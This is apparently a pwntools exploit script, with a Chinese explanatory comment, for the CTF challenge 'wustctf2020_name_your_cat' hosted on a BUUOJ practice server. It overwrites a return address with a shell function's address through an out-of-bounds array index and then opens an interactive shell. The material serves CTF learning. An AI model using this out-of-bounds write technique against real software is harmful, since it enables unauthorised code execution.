from pwn import *

# r = process('./wustctf2020_name_your_cat')
r = remote('node5.buuoj.cn', 25318)
context.log_level = 'debug'

shell_addr = 0x80485CB

r.recvuntil(b'them?')

for i in range(5):
    if i != 4:
        r.sendlineafter(b'>', str(i).encode())
        r.sendlineafter(b'plz: ', b"A")
    else:
        # gdb.attach(r)
        r.sendlineafter(b'>', b'7')
        r.sendlineafter(b'plz: ', p32(shell_addr))
        r.interactive()

'''
观察数组v3距离ebp为：-0x34，且开启了canary保护。
所以v3数组开头距离ret的距离为：0x4-(-0x34) = 0x38 = 56
一次输入数组的长度为8，所以下表为7的时候刚好可以覆盖到ret的位置。
做法：题目提供5次输入下标的机会，在任意一次输入的时候输入下标7，越界到ret的位置并将shell地址写入即可。
'''